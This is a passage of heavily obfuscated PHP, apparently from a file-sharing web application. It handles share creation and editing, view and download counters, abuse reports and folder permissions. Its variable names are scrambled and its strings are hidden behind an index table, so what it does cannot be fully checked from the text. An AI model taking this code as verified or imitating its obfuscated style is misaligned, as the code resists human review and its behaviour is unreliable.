$¶Æ»¢œù[2102]) { if ($ÚÃèÖßë[$¶Æ»¢œù[562]] == $¶Æ»¢œù[91]) { Model($¶Æ»¢œù[633])->eventShare($ØÀÕ©™¦, $¶Æ»¢œù[2103]); } if ($ÚÃèÖßë[$¶Æ»¢œù[663]] == $¶Æ»¢œù[91]) { Model($¶Æ»¢œù[633])->eventShare($ØÀÕ©™¦, $¶Æ»¢œù[2104]); } return; } $¦®¨„×á = $this->getInfoByPath($ØÀÕ©™¦); $«áèµ‹ = $¶Æ»¢œù[2105]; if ($¦®¨„×á[$¶Æ»¢œù[562]] == $¶Æ»¢œù[228] && $ÚÃèÖßë[$¶Æ»¢œù[562]] == $¶Æ»¢œù[91]) { $«áèµ‹ = $¶Æ»¢œù[2103]; } if ($¦®¨„×á[$¶Æ»¢œù[562]] == $¶Æ»¢œù[91] && $ÚÃèÖßë[$¶Æ»¢œù[562]] == $¶Æ»¢œù[228]) { $«áèµ‹ = $¶Æ»¢œù[2106]; } if ($¦®¨„×á[$¶Æ»¢œù[663]] == $¶Æ»¢œù[228] && $ÚÃèÖßë[$¶Æ»¢œù[663]] == $¶Æ»¢œù[91]) { $«áèµ‹ = $¶Æ»¢œù[2104]; } if ($¦®¨„×á[$¶Æ»¢œù[663]] == $¶Æ»¢œù[91] && $ÚÃèÖßë[$¶Æ»¢œù[663]] == $¶Æ»¢œù[228]) { $«áèµ‹ = $¶Æ»¢œù[2107]; } Model($¶Æ»¢œù[633])->eventShare($ØÀÕ©™¦, $«áèµ‹); return; } private function _addShareData($¿Œ™€®Í, $àÅÃª¡ = array(), $ìÎÊõ•™ = false) { $İú´Ü• =& $_SERVER[ìïæ“œî]; $±ùØ¯êš = $ìÎÊõ•™ == $İú´Ü•[191] ? 0 : USER_ID; $‰à¸°Ü´ = array($İú´Ü•[491] => $¿Œ™€®Í, $İú´Ü•[1738] => $±ùØ¯êš); if ($¿Œ™€®Í == 0) { $‰à¸°Ü´ = array($İú´Ü•[2108] => $àÅÃª¡[$İú´Ü•[1234]], $İú´Ü•[1738] => $±ùØ¯êš); } if ($’¼Ú¹ªû = $this->where($‰à¸°Ü´)->find()) { return $’¼Ú¹ªû[$İú´Ü•[665]]; } if ($¿Œ™€®Í == 0) { $Ïäá¼ É = array($İú´Ü•[32] => get_path_this($àÅÃª¡[$İú´Ü•[87]])); } else { $Ïäá¼ É = Model($İú´Ü•[873])->sourceInfo($¿Œ™€®Í); if (!$Ïäá¼ É) { return !1; } } if (!$àÅÃª¡[$İú´Ü•[1636]]) { $àÅÃª¡[$İú´Ü•[1636]] = $Ïäá¼ É[$İú´Ü•[32]]; } $Àìöö²’ = array($İú´Ü•[1738] => $±ùØ¯êš, $İú´Ü•[491] => $¿Œ™€®Í, $İú´Ü•[1636] => $İú´Ü•[12], $İú´Ü•[562] => 0, $İú´Ü•[663] => 0, $İú´Ü•[1234] => $İú´Ü•[12], $İú´Ü•[383] => $İú´Ü•[12], $İú´Ü•[944] => $İú´Ü•[12], $İú´Ü•[2109] => 0, $İú´Ü•[2110] => 0, $İú´Ü•[810] => 0, $İú´Ü•[2111] => $İú´Ü•[12], $İú´Ü•[2092] => $İú´Ü•[12]); $å¡å‡Ä = explode($İú´Ü•[50], $İú´Ü•[2112]); foreach ($å¡å‡Ä as $»±ÌÇ¿) { if (!isset($àÅÃª¡[$»±ÌÇ¿])) { continue; } $Àìöö²’[$»±ÌÇ¿] = $àÅÃª¡[$»±ÌÇ¿]; } $íÉ¸É÷Õ = $this->add($Àìöö²’); $ñ²´À¸¨ = array($İú´Ü•[2092] => short_id($íÉ¸É÷Õ)); $this->where(array($İú´Ü•[2113] => $íÉ¸É÷Õ))->save($ñ²´À¸¨); return $íÉ¸É÷Õ; } private function _shareAuthSet($ıÈ£Çú½, $š¬ıñœı) { $¨¹š¶‡§ =& $_SERVER[ìïæ“œî]; if (!is_array($š¬ıñœı)) { return !1; } $ˆ¿…†ìı = Model($¨¹š¶‡§[2058]); $ˆ¿…†ìı->where(array($¨¹š¶‡§[665] => $ıÈ£Çú½))->delete(); $±¼ü‰ÈÏ = array(); foreach ($š¬ıñœı as $ÎúÚ»Ãò) { $‹ŸˆÁ­° = SourceModel::TYPE_USER; if ($ÎúÚ»Ãò[$¨¹š¶‡§[190]] == SourceModel::TYPE_GROUP) { $‹ŸˆÁ­° = SourceModel::TYPE_GROUP; } $ÌğË‚Â = array($¨¹š¶‡§[665] => $ıÈ£Çú½, $¨¹š¶‡§[190] => $‹ŸˆÁ­°, $¨¹š¶‡§[569] => intval($ÎúÚ»Ãò[$¨¹š¶‡§[569]]), $¨¹š¶‡§[2054] => 0, $¨¹š¶‡§[2114] => -1); if ($ÎúÚ»Ãò[$¨¹š¶‡§[2054]]) { $ÌğË‚Â[$¨¹š¶‡§[2054]] = $ÎúÚ»Ãò[$¨¹š¶‡§[2054]]; } else { if ($ÎúÚ»Ãò[$¨¹š¶‡§[2114]]) { $ÌğË‚Â[$¨¹š¶‡§[2114]] = $ÎúÚ»Ãò[$¨¹š¶‡§[2114]]; } } $±¼ü‰ÈÏ[] = $ÌğË‚Â; } return $ˆ¿…†ìı->addAll($±¼ü‰ÈÏ, array(), !0); } public function numViewAdd($Á¸¢•ß³) { $»à°¬™Å =& $_SERVER[ìïæ“œî]; $µ¨Äôø€ = array($»à°¬™Å[2113] => $Á¸¢•ß³); $this->where($µ¨Äôø€)->setAdd($»à°¬™Å[2109]); } public function numDownloadAdd($Îô¹ÃÆŸ) { $ù¦Ï»Ÿü =& $_SERVER[ìïæ“œî]; $ÅµÉÑÙ = array($ù¦Ï»Ÿü[2113] => $Îô¹ÃÆŸ); $this->where($ÅµÉÑÙ)->setAdd($ù¦Ï»Ÿü[2110]); } protected function shareEdit($¶öòóí», $§†¦ÕÆ·) { $™¥Ğ£€° =& $_SERVER[ìïæ“œî]; $Óğ¬ÚÒ = $this->getInfo($¶öòóí»); if (!$Óğ¬ÚÒ) { return !1; } $this->_checkLinkShare($§†¦ÕÆ·, $Óğ¬ÚÒ); $Àˆ¯ê¥ = array(); $×ÄŠµß­ = explode($™¥Ğ£€°[50], $™¥Ğ£€°[2115]); foreach ($×ÄŠµß­ as $ºªÇì—±) { if (!array_key_exists($ºªÇì—±, $§†¦ÕÆ·)) { continue; } $Àˆ¯ê¥[$ºªÇì—±] = $§†¦ÕÆ·[$ºªÇì—±]; } $this->shareEventAdd($Óğ¬ÚÒ[$™¥Ğ£€°[193]], $§†¦ÕÆ·, $™¥Ğ£€°[1915]); $this->where(array($™¥Ğ£€°[2113] => $¶öòóí»))->save($Àˆ¯ê¥); if (isset($§†¦ÕÆ·[$™¥Ğ£€°[2101]])) { $this->_shareAuthSet($¶öòóí», $§†¦ÕÆ·[$™¥Ğ£€°[2101]]); } return !0; } private function _checkLinkShare($ü¶âÓ™“, $’™ÏçÉ) { $«ı“¼Öš =& $_SERVER[ìïæ“œî]; if ($ü¶âÓ™“[$«ı“¼Öš[562]] != $«ı“¼Öš[91]) { return; } $ñ¸«Áª‘ = $’™ÏçÉ[$«ı“¼Öš[90]][$«ı“¼Öš[193]]; if ($’™ÏçÉ[$«ı“¼Öš[90]][$«ı“¼Öš[33]] != $«ı“¼Öš[230]) { $Ú¾»§± = $this->_folderReport($ñ¸«Áª‘); if (!$Ú¾»§±) { return; } show_json(LNG($«ı“¼Öš[2116]) . $«ı“¼Öš[2117] . $Ú¾»§±, !1); } $´¢Œ³› = Model($«ı“¼Öš[873])->fileInfoGet($’™ÏçÉ[$«ı“¼Öš[90]][$«ı“¼Öš[193]]); if (!$´¢Œ³›) { return; } $§ÖøŞ²ß = $this->shareFileMeta($´¢Œ³›[$«ı“¼Öš[541]]); if (isset($§ÖøŞ²ß[$«ı“¼Öš[450]]) && $§ÖøŞ²ß[$«ı“¼Öš[450]] == $«ı“¼Öš[91]) { show_json(LNG($«ı“¼Öš[2118]), !1); } } private function _folderReport($Ğ‡åÇ”Š) { $´°Áœü” =& $_SERVER[ìïæ“œî]; $±Ò×äÇÊ = array($´°Áœü”[541] => array($´°Áœü”[1067], 0), $´°Áœü”[799] => 3); $ØíùÑô‘ = Model($´°Áœü”[2119])->where($±Ò×äÇÊ)->field($´°Áœü”[541])->select(); if (!$ØíùÑô‘) { return !1; } $ØíùÑô‘ = array_to_keyvalue($ØíùÑô‘, $´°Áœü”[12], $´°Áœü”[541]); $œÄŒû÷ = $´°Áœü”[50] . $Ğ‡åÇ”Š . $´°Áœü”[50]; $±Ò×äÇÊ = array($´°Áœü”[541] => array($´°Áœü”[7], $ØíùÑô‘), $´°Áœü”[584] => array($´°Áœü”[459], "\x25{$œÄŒû÷}\45"), $´°Áœü”[505] => 0); $šªÆŞÓ = Model($´°Áœü”[873])->where($±Ò×äÇÊ)->field($´°Áœü”[2120])->find(); if (!$šªÆŞÓ) { return !1; } $§ƒöï•è = substr($šªÆŞÓ[$´°Áœü”[584]], strpos($šªÆŞÓ[$´°Áœü”[584]], $œÄŒû÷)); $±Ò×äÇÊ = array($´°Áœü”[193] => array($´°Áœü”[7], trim($§ƒöï•è, $´°Áœü”[50]))); $îš¹üÀù = Model($´°Áœü”[873])->where($±Ò×äÇÊ)->field($´°Áœü”[32])->select(); $¨Ä¶Ÿº = array_to_keyvalue($îš¹üÀù, $´°Áœü”[12], $´°Áœü”[32]); $¨Ä¶Ÿº[] = $šªÆŞÓ[$´°Áœü”[32]]; return implode($´°Áœü”[8], $¨Ä¶Ÿº); } protected function remove($²Ú–¸’) { $·æ‚È =& $_SERVER[ìïæ“œî]; $¢˜²ƒ§ = is_array($²Ú–¸’) ? $²Ú–¸’ : array($²Ú–¸’); for ($åàæÎĞ¢ = 0; $åàæÎĞ¢ < count($¢˜²ƒ§); $åàæÎĞ¢++) { $ïŒ’ªø = $this->getInfo($¢˜²ƒ§[$åàæÎĞ¢]); if ($ïŒ’ªø[$·æ‚È[663]] == $·æ‚È[91]) { Model($·æ‚È[633])->eventShare($ïŒ’ªø[$·æ‚È[193]], $·æ‚È[2107]); } if ($ïŒ’ªø[$·æ‚È[562]] == $·æ‚È[91]) { Model($·æ‚È[633])->eventShare($ïŒ’ªø[$·æ‚È[193]], $·æ‚È[2106]); } } if (is_array($²Ú–¸’)) { $²Ú–¸’ = array($·æ‚È[7], $²Ú–¸’); } $°„âÛ‘Ç = array($·æ‚È[665] => $²Ú–¸’); $½ÌÏğòÍ = $this->where($°„âÛ‘Ç)->delete(); if ($½ÌÏğòÍ) { Model($·æ‚È[666])->where(array($·æ‚È[665] => $²Ú–¸’))->delete(); } return $½ÌÏğòÍ; } protected function removeBySource($šÓ±««) { $Âú¤³ÄĞ =& $_SERVER[ìïæ“œî]; $‘ÅÀïùè = array($Âú¤³ÄĞ[491] => array($Âú¤³ÄĞ[492], $šÓ±««)); $ÜÒŠï±Ù = $this->field($Âú¤³ÄĞ[665])->where($‘ÅÀïùè)->select(); $ÜÒŠï±Ù = array_to_keyvalue($ÜÒŠï±Ù, $Âú¤³ÄĞ[12], $Âú¤³ÄĞ[665]); if (!$ÜÒŠï±Ù) { return; } $‘ÅÀïùè = array($Âú¤³ÄĞ[2113] => array($Âú¤³ÄĞ[492], $ÜÒŠï±Ù)); $this->where($‘ÅÀïùè)->delete(); Model($Âú¤³ÄĞ[666])->where($‘ÅÀïùè)->delete(); } public function listAll($É©­¥‡Ø) { $®êÇµàÙ =& $_SERVER[ìïæ“œî]; $Ìûù Û = array(); if ($É©­¥‡Ø[$®êÇµàÙ[1747]]) { $Ìûù Û[$®êÇµàÙ[1747]] = $É©­¥‡Ø[$®êÇµàÙ[1747]]; } if ($É©­¥‡Ø[$®êÇµàÙ[809]]) { $©¢âŸ™ô = $É©­¥‡Ø[$®êÇµàÙ[810]] ? $É©­¥‡Ø[$®êÇµàÙ[810]] : strtotime(date($®êÇµàÙ[2121])); $Ìûù Û[$®êÇµàÙ[231]] = array($®êÇµàÙ[409], array($É©­¥‡Ø[$®êÇµàÙ[809]], $©¢âŸ™ô)); } if ($É©­¥‡Ø[$®êÇµàÙ[33]]) { $Ìûù Û[$É©­¥‡Ø[$®êÇµàÙ[33]]] = 1; } else { $Ìûù Û[] = array($®êÇµàÙ[562] => array($®êÇµàÙ[1067], 0), $®êÇµàÙ[663] => array($®êÇµàÙ[1067], 0), $®êÇµàÙ[2095] => $®êÇµàÙ[2048]); } if ($É©­¥‡Ø[$®êÇµàÙ[2044]]) { $Ìûù Û[] = array($®êÇµàÙ[2092] => $É©­¥‡Ø[$®êÇµàÙ[2044]], $®êÇµàÙ[1636] => array($®êÇµàÙ[459], "\45{$É©­¥‡Ø[$®êÇµàÙ[2044]]}\x25"), $®êÇµàÙ[2095] => $®êÇµàÙ[2048]); } $’¢¢¹Ï = $this->_makeOrder()->where($Ìûù Û)->selectPage(20); if (empty($’¢¢¹Ï[$®êÇµàÙ[445]])) { return array(); } $this->_listDataApply($’¢¢¹Ï[$®êÇµàÙ[445]]); return $’¢¢¹Ï; } public function listDataApply($…Å×°à) { $this->_listDataApply($…Å×°à); return $…Å×°à; } private function _listDataApply(&$é™«§) { $€¤•ÃÛ =& $_SERVER[ìïæ“œî]; $ˆˆæ¯ÇÔ = array_to_keyvalue($é™«§, $€¤•ÃÛ[12], $€¤•ÃÛ[1747]); $ÛÙ¬™ü = Model($€¤•ÃÛ[598])->userListInfo(array_unique($ˆˆæ¯ÇÔ)); $¶ú™®ø­ = array_to_keyvalue($é™«§, $€¤•ÃÛ[12], $€¤•ÃÛ[193]); $ééÚˆøÑ = Model($€¤•ÃÛ[873])->sourceListInfo($¶ú™®ø­, !0); foreach ($é™«§ as $«ªóøÑ => &$”ß•€óÈ) { $×ÊÛ†›¨ = $”ß•€óÈ[$€¤•ÃÛ[1747]]; $”ß•€óÈ[$€¤•ÃÛ[2122]] = $ÛÙ¬™ü[$×ÊÛ†›¨] ? $ÛÙ¬™ü[$×ÊÛ†›¨] : !1; $úÃ»×„“ = $”ß•€óÈ[$€¤•ÃÛ[193]]; $”ß•€óÈ[$€¤•ÃÛ[90]] = $ééÚˆøÑ[$úÃ»×„“] ? $ééÚˆøÑ[$úÃ»×„“] : !1; if ($”ß•€óÈ[$€¤•ÃÛ[90]][$€¤•ÃÛ[505]] == $€¤•ÃÛ[91]) { unset($é™«§[$«ªóøÑ]); } if ($”ß•€óÈ[$€¤•ÃÛ[90]] != $€¤•ÃÛ[228] && !$”ß•€óÈ[$€¤•ÃÛ[90]]) { unset($é™«§[$«ªóøÑ]); } } unset($”ß•€óÈ); $é™«§ = array_values($é™«§); } private function _makeOrder($ ã™è¬¦ = '') { $ÍÏà÷ÊÃ =& $_SERVER[ìïæ“œî]; $™¯Ò¢éò = array($ÍÏà÷ÊÃ[231], $ÍÏà÷ÊÃ[810], $ÍÏà÷ÊÃ[2109], $ÍÏà÷ÊÃ[2110]); $›‹™ÉŠØ = array($ÍÏà÷ÊÃ[523] => $ÍÏà÷ÊÃ[524], $ÍÏà÷ÊÃ[525] => $ÍÏà÷ÊÃ[526]); $¶©ìÖŒâ = Input::get($ÍÏà÷ÊÃ[530], $ÍÏà÷ÊÃ[7], $ÍÏà÷ÊÃ[497], $™¯Ò¢éò); $œê¼æéÛ = Input::get($ÍÏà÷ÊÃ[531], $ÍÏà÷ÊÃ[7], $ÍÏà÷ÊÃ[2123], array($ÍÏà÷ÊÃ[2041], $ÍÏà÷ÊÃ[525])); $œê¼æéÛ = $›‹™ÉŠØ[$œê¼æéÛ]; $ ã™è¬¦ = $ ã™è¬¦ . "{$¶©ìÖŒâ}\40{$œê¼æéÛ}"; return $this->order($ ã™è¬¦); } public function reportAdd($›¤·³ß’) { $Ø˜¥Ê¸™ =& $_SERVER[ìïæ“œî]; $–ä³Äˆ‹ = array($Ø˜¥Ê¸™[665] => $›¤·³ß’[$Ø˜¥Ê¸™[665]], $Ø˜¥Ê¸™[1747] => USER_ID); if (Model($Ø˜¥Ê¸™[2119])->where($–ä³Äˆ‹)->find()) { return !1; } $»Í§¿ı– = array($Ø˜¥Ê¸™[665] => $›¤·³ß’[$Ø˜¥Ê¸™[665]], $Ø˜¥Ê¸™[1636] => $›¤·³ß’[$Ø˜¥Ê¸™[1636]], $Ø˜¥Ê¸™[193] => $›¤·³ß’[$Ø˜¥Ê¸™[193]], $Ø˜¥Ê¸™[541] => $›¤·³ß’[$Ø˜¥Ê¸™[541]], $Ø˜¥Ê¸™[1747] => USER_ID, $Ø˜¥Ê¸™[33] => $›¤·³ß’[$Ø˜¥Ê¸™[33]], $Ø˜¥Ê¸™[526] => $›¤·³ß’[$Ø˜¥Ê¸™[526]]); return Model($Ø˜¥Ê¸™[2119])->add($»Í§¿ı–); } public function reportList($¢íœ…Ç) { $åã¥´ï¡ =& $_SERVER[ìïæ“œî]; $Ùâ¼¡ = array(); if ($¢íœ…Ç[$åã¥´ï¡[809]]) { $‘îÂÈ…¶ = $¢íœ…Ç[$åã¥´ï¡[810]] ? $¢íœ…Ç[$åã¥´ï¡[810]] : strtotime(date($åã¥´ï¡[2121])); $Ùâ¼¡[$åã¥´ï¡[231]] = array($åã¥´ï¡[409], array($¢íœ…Ç[$åã¥´ï¡[809]], $‘îÂÈ…¶)); } if (isset($¢íœ…Ç[$åã¥´ï¡[33]]) && in_array($¢íœ…Ç[$åã¥´ï¡[33]], array($åã¥´ï¡[91], $åã¥´ï¡[510], $åã¥´ï¡[2124], $åã¥´ï¡[2125], $åã¥´ï¡[2126]))) { $Ùâ¼¡[$åã¥´ï¡[33]] = $¢íœ…Ç[$åã¥´ï¡[33]]; } if (isset($¢íœ…Ç[$åã¥´ï¡[799]]) && in_array($¢íœ…Ç[$åã¥´ï¡[799]], array($åã¥´ï¡[228], $åã¥´ï¡[91], $åã¥´ï¡[510], $åã¥´ï¡[2124]))) { $Ùâ¼¡[$åã¥´ï¡[799]] = $¢íœ…Ç[$åã¥´ï¡[799]]; } $ÙÈâ­ˆ = Input::get($åã¥´ï¡[531], $åã¥´ï¡[7], $åã¥´ï¡[2123], array($åã¥´ï¡[2041], $åã¥´ï¡[525])); $õ½²ßÌ« = array($åã¥´ï¡[523] => $åã¥´ï¡[524], $åã¥´ï¡[525] => $åã¥´ï¡[526]); $Ú®äŠ§ = $åã¥´ï¡[2127] . $õ½²ßÌ«[$ÙÈâ­ˆ]; $‘§ûÌËé = Model($åã¥´ï¡[2119])->where($Ùâ¼¡)->order($Ú®äŠ§)->selectPage(20); if (empty($‘§ûÌËé[$åã¥´ï¡[445]])) { return array(); } $©íÏ¬ìÌ = array_to_keyvalue_group($‘§ûÌËé[$åã¥´ï¡[445]], $åã¥´ï¡[799], $åã¥´ï¡[665]); if (!empty($©íÏ¬ìÌ[0])) { $¢íœ…Ç = $©íÏ¬ìÌ[0]; $Ùâ¼¡ = array($åã¥´ï¡[665] => array($åã¥´ï¡[7], $¢íœ…Ç)); $ŸğŸİÎş = $this->where($Ùâ¼¡)->field($åã¥´ï¡[665])->select(); $ŸğŸİÎş = array_to_keyvalue($ŸğŸİÎş, $åã¥´ï¡[12], $åã¥´ï¡[665]); $Şå¸Ñ©› = array_diff($¢íœ…Ç, $ŸğŸİÎş); if (!empty($Şå¸Ñ©›)) { foreach ($‘§ûÌËé[$åã¥´ï¡[445]] as $šÊ‡ÅÊ¶ => $ÊÎˆçß) { if (in_array($ÊÎˆçß[$åã¥´ï¡[665]], $Şå¸Ñ©›)) { unset($‘§ûÌËé[$åã¥´ï¡[445]][$šÊ‡ÅÊ¶]); } } } } $this->_listDataApply($‘§ûÌËé[$åã¥´ï¡[445]]); return $‘§ûÌËé; } public function reportStatus($‚÷Øºã) { $ëšïË€Ò =& $_SERVER[ìïæ“œî]; $é˜—ò§¯ = array($ëšïË€Ò[475] => $‚÷Øºã[$ëšïË€Ò[475]]); $÷­òç” = Model($ëšïË€Ò[2119])->where($é˜—ò§¯)->field($ëšïË€Ò[2128])->find(); if (!$÷­òç”) { return !1; } $ˆ™û¡×‰ = array($ëšïË€Ò[799] => $‚÷Øºã[$ëšïË€Ò[799]]); if ($‚÷Øºã[$ëšïË€Ò[799]] == $ëšïË€Ò[2124] && $÷­òç”[$ëšïË€Ò[799]] == $ëšïË€Ò[2124]) { $ˆ™û¡×‰[$ëšïË€Ò[799]] = 0; } $ŠÖ§¬»  = Model($ëšïË€Ò[2119])->where($é˜—ò§¯)->save($ˆ™û¡×‰); if ($‚÷Øºã[$ëšïË€Ò[799]] == $ëšïË€Ò[510]) { if ($÷­òç”[$ëšïË€Ò[541]] != $ëšïË€Ò[228] && $this->shareFileMeta($÷­òç”[$ëšïË€Ò[541]])) { $this->shareFileMeta($÷­òç”[$ëšïË€Ò[541]], 0); } $this->remove($÷­òç”[$ëšïË€Ò[665]]); return !0; } if ($ŠÖ§¬»  && $‚÷Øºã[$ëšïË€Ò[799]] == $ëšïË€Ò[2124]) { $Åû†š¸ = $ˆ™û¡×‰[$ëšïË€Ò[799]] == $ëšïË€Ò[2124] ? 1 : 0; $this->shareFileMeta($÷­òç”[$ëšïË€Ò[541]], $Åû†š¸); $this->removeByFile($÷­òç”[$ëšïË€Ò[541]]); } return $ŠÖ§¬» ; } private function removeByFile($ô•È†Èæ) { $¯Áú°­ë =& $_SERVER[ìïæ“œî]; $Ê¢İéè = Model($¯Áú°­ë[873])->where(array($¯Áú°­ë[541] => $ô•È†Èæ))->field($¯Áú°­ë[193])->select(); $Ü¤¡şã = array_to_keyvalue($Ê¢İéè, $¯Áú°­ë[12], $¯Áú°­ë[193]); $şéÙ®ÂÅ = array($¯Áú°­ë[193] => array($¯Áú°­ë[7], $Ü¤¡şã), $¯Áú°­ë[562] => 1); $Ê¢İéè = $this->where($şéÙ®ÂÅ)->field($¯Áú°­ë[665])->select(); if (empty($Ê¢İéè)) { return; } $œÜ´ê = array_to_keyvalue($Ê¢İéè, $¯Áú°­ë[12], $¯Áú°­ë[665]); $this->remove($œÜ´ê); } private function shareFileMeta($€ï‚óÓ„, $‘‰ßÊâ² = null) { $£ÔŸÆìÁ =& $_SERVER[ìïæ“œî]; $æº¦ÎĞ‚ = array($£ÔŸÆìÁ[541] => $€ï‚óÓ„, $£ÔŸÆìÁ[97] => $£ÔŸÆìÁ[2129]); if (is_null($‘‰ßÊâ²)) { return Model($£ÔŸÆìÁ[2130])->where($æº¦ÎĞ‚)->find(); } $æº¦ÎĞ‚[$£ÔŸÆìÁ[450]] = $‘‰ßÊâ²; Model($£ÔŸÆìÁ[2130])->add($æº¦ÎĞ‚, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\162\x63\145\x5f\141\165\164\x68"; public function getAuth($É§Âß²í) { $çÂıí­ï =& $_SERVER[ìïæ“œî]; $ÂŸ´Óï¡ = $this->sourceAuthSelect($É§Âß²í); $éÜ¦ŞÊ… = array(); $ÄµáŞ™ = array(); $½ªäğ‚× = 2 << 25; foreach ($ÂŸ´Óï¡ as $‹¤’óÍ) { $µ—¸…Ñ¢ = Model($çÂıí­ï[571])->listData($‹¤’óÍ[$çÂıí­ï[2054]]); if (!$µ—¸…Ñ¢) { continue; } $éÜ¦ŞÊ…[] = $‹¤’óÍ; $˜ÍÓ§òã = 0; if ($‹¤’óÍ[$çÂıí­ï[190]] == SourceModel::TYPE_GROUP) { $˜ÍÓ§òã = $½ªäğ‚× * 2; } if ($‹¤’óÍ[$çÂıí­ï[190]] == SourceModel::TYPE_USER) { $˜ÍÓ§òã = $½ªäğ‚×; } if ($‹¤’óÍ[$çÂıí­ï[190]] == SourceModel::TYPE_USER && $‹¤’óÍ[$çÂıí­ï[569]] == $çÂıí­ï[228]) { $˜ÍÓ§òã = 0; } $ÄµáŞ™[] = $µ—¸…Ñ¢[$çÂıí­ï[487]] + $˜ÍÓ§òã; } array_multisort($ÄµáŞ™, SORT_DESC, $éÜ¦ŞÊ…); return $éÜ¦ŞÊ…; } public function sourceAuthSelect($‘ÄÊÊî) { $ŠáÈşİ– =& $_SERVER[ìïæ“œî]; static $ıİ©Ôùö = array(); $ÛÀøÖäÜ = is_array($‘ÄÊÊî) ? !1 : !0; if ($ÛÀøÖäÜ) { $‘ÄÊÊî = array($‘ÄÊÊî); } $öøáŞ–× = array(); foreach ($‘ÄÊÊî as $Ä«€ïÊ) { if (isset($ıİ©Ôùö[$Ä«€ïÊ])) { $öøáŞ–×[$Ä«€ïÊ] = $ıİ©Ôùö[$Ä«€ïÊ]; } } if (count($öøáŞ–×) == count($‘ÄÊÊî)) { return $ÛÀøÖäÜ ? $öøáŞ–×[$‘ÄÊÊî[0]] : $öøáŞ–×; } $àÔôºÙ© = $ŠáÈşİ–[2131]; $ï²¡‚ = array($ŠáÈşİ–[193] => array($ŠáÈşİ–[7], $‘ÄÊÊî)); $»•İË—Ã = $this->field($àÔôºÙ©)->order($ŠáÈşİ–[475])->where($ï²¡‚)->select(); $ÈšÍ¾ú = array_to_keyvalue_group($»•İË—Ã, $ŠáÈşİ–[193]); foreach ($‘ÄÊÊî as $Ä«€ïÊ) { $ıİ©Ôùö[$Ä«€ïÊ] = $ÈšÍ¾ú[$Ä«€ïÊ] ? $ÈšÍ¾ú[$Ä«€ïÊ] : array(); } if ($ÛÀøÖäÜ) { return $»•İË—Ã; } return $ÈšÍ¾ú; } public function setAuth($ìèõ…°Æ, $ŸºÀ½öĞ) { $ÕƒñİÅŞ =& $_SERVER[ìïæ“œî]; $Æ‰’ÄÕÚ = Model($ÕƒñİÅŞ[1394])->sourceInfo($ìèõ…°Æ); if (!$Æ‰’ÄÕÚ) { return !1; } if ($Æ‰’ÄÕÚ[$ÕƒñİÅŞ[190]] != SourceModel::TYPE_GROUP) { return !1; } $‹ÎÎ½ÁÂ = 1; $í°¹âµŒ = $Æ‰’ÄÕÚ[$ÕƒñİÅŞ[569]]; if ($í°¹âµŒ != $‹ÎÎ½ÁÂ) { $©’ûà–ƒ = array($ÕƒñİÅŞ[1946] => $í°¹âµŒ); $˜…‹Ó… = Model($ÕƒñİÅŞ[2040])->field($ÕƒñİÅŞ[1747])->where($©’ûà–ƒ)->select(); $˜…‹Ó… = array_to_keyvalue($˜…‹Ó…, $ÕƒñİÅŞ[12], $ÕƒñİÅŞ[1747]); } $ïÍ¥ÏÎ­ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $³Åî“¹ç = array(); foreach ($ŸºÀ½öĞ as $µ‚¾²¾ø) { if (!in_array($µ‚¾²¾ø[$ÕƒñİÅŞ[190]], $ïÍ¥ÏÎ­)) { show_json(LNG($ÕƒñİÅŞ[2132]), !1); } if ($í°¹âµŒ != $‹ÎÎ½ÁÂ) { if ($µ‚¾²¾ø[$ÕƒñİÅŞ[190]] == SourceModel::TYPE_GROUP) { } if ($µ‚¾²¾ø[$ÕƒñİÅŞ[569]] != 0 && !in_array($µ‚¾²¾ø[$ÕƒñİÅŞ[569]], $˜…‹Ó…)) { } } if ($µ‚¾²¾ø[$ÕƒñİÅŞ[569]] == 0) { $µ‚¾²¾ø[$ÕƒñİÅŞ[190]] = SourceModel::TYPE_USER; } $³Åî“¹ç[] = array($ÕƒñİÅŞ[193] => $ìèõ…°Æ, $ÕƒñİÅŞ[190] => intval($µ‚¾²¾ø[$ÕƒñİÅŞ[190]]), $ÕƒñİÅŞ[569] => intval($µ‚¾²¾ø[$ÕƒñİÅŞ[569]]), $ÕƒñİÅŞ[2054] => intval($µ‚¾²¾ø[$ÕƒñİÅŞ[2054]]) ? intval($µ‚¾²¾ø[$ÕƒñİÅŞ[2054]]) : 0, $ÕƒñİÅŞ[2114] => intval($µ‚¾²¾ø[$ÕƒñİÅŞ[2114]]) ? intval($µ‚¾²¾ø[$ÕƒñİÅŞ[2114]]) : -1); } $this->where(array($ÕƒñİÅŞ[491] => $ìèõ…°Æ))->delete(); $this->addAll($³Åî“¹ç); return !0; } public function authClear($˜õá¿¡÷) { $±·ÒÄÔÉ =& $_SERVER[ìïæ“œî]; $úıå¬¤ = Model($±·ÒÄÔÉ[1394])->sourceInfo($˜õá¿¡÷); $ú¼˜„ˆ = array($˜õá¿¡÷); if ($úıå¬¤[$±·ÒÄÔÉ[485]] == $±·ÒÄÔÉ[91]) { $‘òïí—î = array($±·ÒÄÔÉ[652] => array($±·ÒÄÔÉ[612], $úıå¬¤[$±·ÒÄÔÉ[584]] . $˜õá¿¡÷ . $±·ÒÄÔÉ[613])); $ú¼˜„ˆ = Model($±·ÒÄÔÉ[1394])->field($±·ÒÄÔÉ[491])->where($‘òïí—î)->getField($±·ÒÄÔÉ[193], !0); $ú¼˜„ˆ[] = $˜õá¿¡÷; } $this->where(array($±·ÒÄÔÉ[491] => array($±·ÒÄÔÉ[492], $ú¼˜„ˆ)))->delete(); return !0; } public function getAllChildren($ğ¢şÉÀÃ) { $ã§çò ô =& $_SERVER[ìïæ“œî]; $»ä“¬¨ = Model($ã§çò ô[1394])->sourceInfo($ğ¢şÉÀÃ); if ($»ä“¬¨[$ã§çò ô[485]] != $ã§çò ô[91]) { return $this->sourceListAuth(array($ğ¢şÉÀÃ)); } if ($»ä“¬¨[$ã§çò ô[190]] != SourceModel::TYPE_GROUP) { return array(); } $»ïÚ­ƒ = 1; $Ùò¸Ëã­ = array($ğ¢şÉÀÃ); if ($»ä“¬¨[$ã§çò ô[192]] == $ã§çò ô[228] && $»ä“¬¨[$ã§çò ô[569]] != $»ïÚ­ƒ) { $Ùò¸Ëã­ = $this->groupChidldAllRootSource($»ä“¬¨[$ã§çò ô[569]]); } $æÄ¿ò¼Œ = $this->field($ã§çò ô[193])->group($ã§çò ô[193])->select(); $æÄ¿ò¼Œ = array_to_keyvalue($æÄ¿ò¼Œ, $ã§çò ô[12], $ã§çò ô[193]); if (!$æÄ¿ò¼Œ) { return array(); } 